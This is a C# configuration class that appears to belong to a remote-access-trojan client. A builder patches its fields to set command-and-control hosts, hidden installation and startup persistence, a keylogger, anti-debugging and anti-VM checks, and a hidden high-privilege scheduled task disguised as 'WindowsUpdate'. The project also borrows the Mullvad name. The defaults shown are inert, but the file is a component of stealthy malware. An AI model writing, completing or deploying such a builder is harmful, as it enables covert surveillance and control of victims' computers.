namespace mullvad.Client.Config
{
    public static class Settings
    {
        // All fields are patched by the builder via Mono.Cecil IL rewriting.
        // Each assignment in the static constructor is a direct ldstr/ldc → stsfld pattern.
        public static string Version;
        public static string RawHosts;           // "host1:port|host2:port"
        public static int    ReconnectDelay;
        public static string Tag;
        public static string Mutex;
        public static bool   Install;
        public static int    InstallPath;        // 1=AppData 2=ProgramFiles 3=System
        public static string InstallSubDirectory;
        public static string InstallName;
        public static bool   Startup;
        public static string StartupName;
        public static bool   HideFile;
        public static bool   HideSubDirectory;
        public static bool   DebugConsole;
        public static bool   RequireAdmin;
        public static bool   AntiDebug;
        public static bool   AntiTamper;
        public static bool   AntiVirtual;
        public static bool   Keylogger;
        public static string LogDirectoryName;
        public static bool   HideLogDirectory;
        public static bool   UseTaskScheduler;
        public static string TaskName;
        public static int    TaskTrigger;
        public static int    TaskInterval;
        public static bool   TaskHighestPrivileges;
        public static bool   TaskLoggedOffRun;
        public static bool   TaskHidden;
        public static bool   TaskRestartOnFailure;

        static Settings()
        {
            Version              = "1.0.0";
            RawHosts             = "127.0.0.1:7777";
            ReconnectDelay       = 5000;
            Tag                  = "Mole";
            Mutex                = "mullvad_default_mutex";
            Install              = false;
            InstallPath          = 1;
            InstallSubDirectory  = "mullvad";
            InstallName          = "client";
            Startup              = false;
            StartupName          = "mullvad";
            HideFile             = false;
            HideSubDirectory     = false;
            DebugConsole         = false;
            RequireAdmin         = false;
            AntiDebug            = false;
            AntiTamper           = false;
            AntiVirtual          = false;
            Keylogger            = false;
            LogDirectoryName     = "Logs";
            HideLogDirectory     = false;
            UseTaskScheduler     = false;
            TaskName             = "WindowsUpdate";
            TaskTrigger          = 0;
            TaskInterval         = 30;
            TaskHighestPrivileges = false;
            TaskLoggedOffRun     = false;
            TaskHidden           = false;
            TaskRestartOnFailure = false;
        }
    }
}
